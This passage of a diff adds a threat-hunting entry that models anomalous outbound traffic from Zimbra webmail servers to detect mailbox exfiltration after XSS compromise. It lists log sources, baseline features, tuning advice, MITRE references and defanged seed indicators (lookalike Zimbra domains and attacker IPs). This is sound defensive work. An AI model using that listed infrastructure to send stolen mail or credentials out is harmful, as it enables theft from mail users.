Zimbra access/mailbox audit logs (mailbox.log, audit.log) for read/search/export volume per account; DNS logs for first-seen external domain resolution from the mail tier. FEATURES per webmail server AND per authenticated user over a rolling ~30-day baseline: summed outbound bytes to external destinations; count of distinct external domains contacted; share of egress to first-seen / newly-registered domains; request rate to a single external host; egress outside business hours; ratio of current egress to that entity's historical mean; correlation of an egress spike with a preceding inbound HTML-attachment email. MODEL: per-entity baseline + robust outlier scoring (z-score/MAD or isolation forest) on the volume and destination-novelty features; alert when an entity crosses from its normal envelope into sustained high-volume egress, weighted heavily when the destination is first-seen or matches a Zimbra-lookalike naming pattern.\n\nKNOWN-BAD SEED IOCs (for backtest/enrichment, not as the detection): domains masquerading as Zimbra services — zimbra-metadata[.]com, zimbrastat[.]com, zimbrasoft[.]com[.]ua, synacorzimbra[.]nl, mailnalysis[.]com, emailanalytics[.]com[.]ua, analyticemailmeter[.]com, istc-cloud[.]com; IPs 37.120.247[.]228, 64.226.124[.]190, 104.248.134[.]194, 185.86.79[.]95, 193.238.152[.]66, 194.156.103[.]193, 216.252.238[.]18/.64/.104. VALIDATION / TUNING: backtest against known heavy periods (mail migrations, bulk-export/eDiscovery, newsletter sends) to set per-entity thresholds; allowlist sanctioned integrations/federation destinations by domain but keep them baselined. NAIVE FOIL: a fixed \"N MB/day out of the mail server\" threshold — bypassed by paced multi-week exfil and noisy on federated servers; the separating signal is deviation from the entity's own egress baseline plus destination novelty. CROSS-REF: T1114.002 (Remote Email Collection — what is being staged/stolen), T1556.006 (MFA interception — the 2FA/session material the payload also grabs), and T1189 (drive-by/zero-click XSS as the delivery) for the upstream legs.",
+    "tags": [
+      "exfiltration",
+      "linux",
+      "webmail",
+      "zimbra",
+      "email_collection",
+      "volumetric",
+      "model_assisted",
+      "void_blizzard",
+      "laundry_bear",
+      "t1048_003",
+      "t1114_002",
+      "t1556_006",
+      "T1048.003"
+    ],
+    "techniques": [
+      "T1048.003"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- **The request is legitimate; the volume and destination are not.** A webmail server making outbound web requests is normal, and the XSS payload runs inside a real authenticated session, so no single request is malicious — only the deviation from the server's/user's own egress envelope, and the novelty of the destination, separate theft from work. That per-entity anomaly framing is why this is an Alchemy hunt, not a Flame.\n- **Static thresholds lose both ways here.** The actor paced collection over a ~35-day dwell and the campaign's transport/volume were never published, so a fixed MB/day limit is both bypassed by slow exfil and noisy on federated mail servers; a per-entity baseline adapts to each server's normal and catches the relative spike.\n- **Destination novelty is the durable half of the signal.** The operators used domains dressed up as Zimbra analytics/metadata services; modeling the *rate of first-seen external destinations* from the mail tier catches the pattern even after the specific lookalike domains rotate — where an IOC block-list goes stale.\n- **The mail tier is a bright, well-scoped place to watch.** Webmail servers have a small, stable set of legitimate external destinations, so egress anomalies there carry far more signal than the same analytic run against general user browsing.",
+    "references": "- [MITRE ATT&CK T1048.003: Exfiltration Over Alternative Protocol — Exfiltration Over Unencrypted Non-C2 Protocol](https://attack.mitre.org/techniques/T1048/003/)\n- [Unit 42 (Palo Alto Networks): Russian Global Webmail Espionage (CL-STA-1114 / Void Blizzard)](https://unit42.paloaltonetworks.com/russian-webmail-espionage/)\n- [CISA Advisory AA26-204A: Russian State-Supported Cyber Actors Conduct Phishing Campaign Targeting Zimbra Collaboration Suite Users](https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-204a)\n- [ESET Research: Operation RoundPress — XSS Exploitation of Webmail Servers (Zimbra/Roundcube/Horde)](https://www.welivesecurity.com/en/eset-research/operation-roundpress/)\n- [Elastic Security Labs: Hunting for Data Exfiltration Over the Network](https://www.elastic.co/security-labs/network-exfiltration-detection)\n- [MITRE ATT&CK T1114.002: Email Collection — Remote Email Collection](https://attack.mitre.org/techniques/T1114/002/)",
+    "file_path": "Alchemy/M029.md",
+    "created": "2026-07-25T22:17:55-05:00"
   }
 ];
